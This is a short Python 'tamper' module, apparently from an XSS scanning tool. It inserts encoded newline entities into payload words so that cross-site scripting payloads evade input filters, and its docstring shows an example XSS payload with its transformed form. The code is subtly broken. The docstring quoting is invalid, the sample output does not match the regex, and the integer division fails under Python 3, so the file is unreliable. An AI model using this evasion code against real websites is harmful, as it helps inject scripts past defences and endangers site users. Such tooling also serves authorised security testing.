# -*- coding: utf-8 -*
import re
from main_modules.settings import PRIORITY, TYPE
__classificationtype__=TYPE.BackEND_SPECIFIED
__priority__ = PRIORITY.NORMAL




def tamper(payload, **kwargs):
    """
    >>> tamper("<IMG SRC="/x" onerror="javascript:alert('XSS');">")
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
    """
    result=[]
    string=re.sub(r"(?<=[=:])[\w]*(?=[;\s():])",convert_this,str(payload))


    return (string) if payload else payload

def convert_this(string):
    new_word=[]
    string=string.group()
    length=len(string)
    if length>1:
        string=string[:length/2]+"&#x0A"+string[length/2:]
    return string
